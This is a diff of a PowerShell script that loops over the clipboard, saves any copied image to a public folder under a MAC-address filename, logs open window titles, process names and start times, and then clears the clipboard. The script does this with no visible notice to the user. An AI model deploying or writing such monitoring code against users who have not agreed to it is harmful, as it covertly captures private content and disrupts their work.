@@ -1,23 +1,21 @@
-Add-Type @"
-  using System;
-  using System.Runtime.InteropServices;
-  public class Tricks {
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetForegroundWindow();
-}
-"@
+$window = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle).mainwindowtitle
+$process = (Get-Process |where {$_.mainWindowTItle} | select processname).processname
+$starttime = (Get-Process |where {$_.mainWindowTItle} | select starttime).starttime
+$count = $window.count
 
-$a = [tricks]::GetForegroundWindow()
-$process = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle, processname)
 $MAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"}).MacAddress
 do {
-$content = Get-Clipboard -Format Image
-If ($content) 
+$image = Get-Clipboard -Format Image
+If ($image) 
 {
 $path = 'C:\Users\Public\Documents'
 $filename = "$path\${mac}_"+(Get-date -f yyyyMMddHHmmss)+"_clip.png"
-$content.Save($filename,'png')
-$process | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmmss)_clib_process.txt -Append -encoding utf8
+$image.Save($filename,'png')
+for($i=0; $i -lt $count; $i++)
+{
+$window[$i] + ":::;" + $process[$i] + ":::;" + $starttime[$i] | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmmss)_clib_process.txt -Append -encoding utf8
+}
+
 sleep 5
 Set-Clipboard -Value $Null
 }
